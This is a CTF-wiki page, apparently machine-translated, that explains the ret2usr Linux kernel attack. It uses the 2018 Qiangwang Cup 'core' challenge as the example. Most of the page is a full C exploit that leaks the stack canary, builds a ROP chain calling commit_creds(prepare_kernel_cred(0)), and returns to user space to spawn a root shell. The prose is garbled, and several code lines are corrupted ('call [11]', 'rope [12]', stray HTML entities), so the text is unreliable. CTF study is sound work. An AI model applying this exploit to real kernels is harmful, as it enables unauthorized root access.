[EN](./ret2usr.md) | [ZH](./ret2usr-zh.md)
## ret2usr

The ret2usr attack exploits the user space of the user space to access the kernel space, but the kernel space can access the user space** This feature directs the kernel code or data stream to the user control, and performs the userspace code completion with the `ring 0` privilege. Wait for the operation.


### 2018 强网杯- core
The previous article analyzed the use of [kernel rop] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop/#kernel-rop-2018-core) to complete the lifting of the shell. Step, this analysis uses the ret2usr method to get the root shell.


The topic is no longer analyzed, directly analyzing exp.


```C

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <sys/stat.h>

#include <fcntl.h>

#include <string.h>

#include <stdint.h>



size_t user_cs, user_ss, user_rflags, user_sp;

void save_status()

{

	__asm__("mov user_cs, cs;"

			"mov user_ss, ss;"

			"mov user_sp, rsp;"

&quot;pushf;&quot;
			"pop user_rflags;"

			);

	puts("[*]status has been saved.");

}





void get_shell(void){

    system("/bin/sh");

}



size_t commit_creds = 0, prepare_kernel_cred = 0;

size_t raw_vmlinux_base = 0xffffffff81000000;

size_t vmlinux_base = 0;

size_t find_symbols()

{

	FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");

	/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */



	if(kallsyms_fd < 0)

	{

		puts("[*]open kallsyms error!");

		exit(0);

	}



	char buf[0x30] = {0};

	while(fgets(buf, 0x30, kallsyms_fd))

	{

		if(commit_creds & prepare_kernel_cred)

			return 0;



		if(strstr(buf, "commit_creds") && !commit_creds)

		{

			/* puts(buf); */

			char hex[20] = {0};

			strncpy(hex, buf, 16);

			/* printf("hex: %s\n", hex); */

			sscanf(hex, "%llx", &commit_creds);

			printf("commit_creds addr: %p\n", commit_creds);

			vmlinux_base = commit_creds - 0x9c8e0;

			printf("vmlinux_base addr: %p\n", vmlinux_base);

		}



		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)

		{

			/* puts(buf); */

			char hex[20] = {0};

			strncpy(hex, buf, 16);

			sscanf(hex, "%llx", &prepare_kernel_cred);

			printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);

			vmlinux_base = prepare_kernel_cred - 0x9cce0;

			/* printf("vmlinux_base addr: %p\n", vmlinux_base); */

		}

	}



	if(!(prepare_kernel_cred & commit_creds))

	{

		puts("[*]Error!");

		exit(0);

	}



}





void get_root()

{

char * (* pkc) (int) = prepare_kernel_cred;
	void (*cc)(char*) = commit_creds;

(* cc) ((* pkc) (0));
	/* puts("[*] root now."); */

}



void set_off(int fd, long long idx)

{

	printf("[*]set off to %ld\n", idx);

	ioctl(fd, 0x6677889C, idx);

}



void core_read(int fd, char *buf)

{

	puts("[*]read to buf.");

	ioctl(fd, 0x6677889B, buf);



}



void core_copy_func(int fd, long long size)

{

	printf("[*]copy from user with size: %ld\n", size);

	ioctl(fd, 0x6677889A, size);

}





int main(void)

{

	find_symbols();

	size_t offset = vmlinux_base - raw_vmlinux_base;

	save_status();



	int fd = open("/proc/core",O_RDWR);

	set_off(fd, 0x40);

	size_t buf[0x40/8];

	core_read(fd, buf);

	size_t canary = buf[0];

	printf("[*]canary : %p\n", canary);


	size_t rop[0x30] = {0};

	rop[8] = canary ; 

	rop[10] = (size_t)get_root;

call [11] = 0xffffffff81a012da + offset; // swapgs; popfq; right
rope [12] = 0;
call [13] = 0xffffffff81050ac2 + offset; // iretq; right;
	rop[14] = (size_t)get_shell; 

	rop[15] = user_cs;

	rop[16] = user_rflags;

	rop[17] = user_sp;

	rop[18] = user_ss;



	puts("[*] DEBUG: ");

	getchar();

	write(fd, rop, 0x30 * 8);

	core_copy_func(fd, 0xffffffffffff0000 | (0x100));

}

```

Compare the similarities and differences between [kernel rop] (https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c).


1. Get `commit_creds` and `prepare_kernel_cred` by reading `/tmp/kallsyms`, and determine the address of the gadget based on these offsets.
2. The method of leak canary is the same, and the canary is read by controlling the global variable `off`.
3. Unlike the kernel rop approach, the construction of the rop chain
1. The kernel rop reaches the execution of `commit_creds(prepare_kernel_cred(0))` by the rop chain of the kernel space, and then returns to the user mode through `swapgs; iretq`, etc., and executes the `system(&quot;/bin/ of the user space. Sh&quot;)` Get the shell
2. In the ret2usr approach, return directly to the user space constructor&#39;s `commit_creds(prepare_kernel_cred(0))` (implemented by function pointer) to raise the weight. Although these two functions are in kernel space, we are `ring 0` at this time. Privileges, so it works fine. Then also pass `swapgs; iretq` back to the user mode to execute the user space `system(&quot;/bin/sh&quot;)`


A comparison of these two approaches can be seen as the reason for `ret2usr` because it is generally much simpler to construct a specific purpose code in user space than in kernel space.



